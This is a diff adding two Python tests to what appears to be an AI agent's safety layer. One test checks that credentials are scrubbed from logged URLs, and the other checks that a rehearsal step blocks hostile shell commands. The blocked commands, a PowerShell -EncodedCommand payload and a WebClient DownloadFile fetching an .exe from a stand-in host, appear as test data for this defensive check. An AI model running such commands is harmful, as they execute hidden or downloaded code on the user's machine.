@@ -508,6 +508,39 @@ def test_skill_genome_atomic_persist(tmp_path: Path):
     assert leftovers == []
 
 
+def test_action_ir_strips_url_userinfo():
+    ir = start_action_ir(session_id="ir_url", tier=2)
+    ir.add_step(
+        tool="computer_navigate",
+        arguments={"url": "https://alice:s3cret@example.com/x?tok=abc"},
+        result="ok",
+        ok=True,
+    )
+    step = ir.steps[0]
+    blob = json.dumps(step.to_public())
+    assert "s3cret" not in blob
+    assert "tok=abc" not in blob
+    assert "example.com" in blob
+
+
+def test_shadow_blocks_opaque_payload_shell():
+    r = rehearse(
+        "bash_exec",
+        {"command": "powershell -EncodedCommand SQBFAFgA"},
+        tier=2,
+        work_roots=[r"C:\proj"],
+    )
+    assert r.blocked
+    assert r.outcome == "hard_block"
+    r2 = rehearse(
+        "bash_exec",
+        {"command": "(New-Object Net.WebClient).DownloadFile('http://x','a.exe')"},
+        tier=2,
+        work_roots=[r"C:\proj"],
+    )
+    assert r2.blocked
+
+
 def test_governor_compress_earlier_flag():
     from remedy.core.metabolism.governor import get_governor, reset_governor
 
